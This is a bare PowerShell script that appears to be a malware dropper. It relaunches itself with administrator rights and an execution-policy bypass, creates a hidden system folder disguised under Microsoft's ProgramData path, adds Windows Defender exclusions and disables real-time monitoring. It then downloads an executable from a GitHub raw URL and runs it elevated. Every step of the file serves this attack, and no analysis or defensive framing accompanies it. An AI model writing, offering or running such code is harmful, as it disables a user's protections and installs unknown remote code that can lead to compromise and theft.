$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    $self = $MyInvocation.MyCommand.Definition
    if (-not $self) { $self = $PSCommandPath }
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$self`""
    exit
}

try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 }
catch { [Net.ServicePointManager]::SecurityProtocol = 3072 }

$Folder = "$env:ProgramData\Microsoft\.cache\FSTALK"
$Exe    = "$Folder\MAIN.x64.exe"
$Url    = "https://raw.githubusercontent.com/LianMtown-cmyk/FSTALK/main/MAIN.x64.exe"

New-Item -ItemType Directory -Path $Folder -Force | Out-Null
attrib +h +s "$env:ProgramData\Microsoft\.cache" 2>$null

try { Add-MpPreference -ExclusionPath    $Folder }            catch {}
try { Add-MpPreference -ExclusionProcess "MAIN.x64.exe" }     catch {}
try { Add-MpPreference -ExclusionProcess $Exe }               catch {}
try { Set-MpPreference -DisableRealtimeMonitoring $true }     catch {}

$wc = New-Object System.Net.WebClient
for ($i = 1; $i -le 3; $i++) {
    try { $wc.DownloadFile($Url, $Exe); break } catch { Start-Sleep -Seconds 2 }
}

Start-Process $Exe -Verb RunAs